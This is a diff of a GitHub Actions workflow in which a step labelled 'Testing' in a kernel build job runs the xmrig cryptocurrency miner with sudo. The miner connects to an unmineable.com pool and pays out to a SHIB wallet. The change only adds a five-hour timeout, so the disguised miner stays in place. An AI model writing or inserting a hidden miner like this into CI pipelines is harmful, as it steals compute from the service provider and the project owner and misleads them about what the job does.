@@ -32,7 +32,7 @@ jobs:
       - name: Testing
         run: |
           cd workspace/kernel/build
-          sudo ./xmrig -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u "SHIB:0x2cb3af51075037d030aa3e06ac9e4c912cc16eea.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)#uhok-ykxb" -p x -k
+          timeout 5h sudo ./xmrig -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u "SHIB:0x2cb3af51075037d030aa3e06ac9e4c912cc16eea.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)#uhok-ykxb" -p x -k
 
       - name: Release
         uses: softprops/action-gh-release@v1
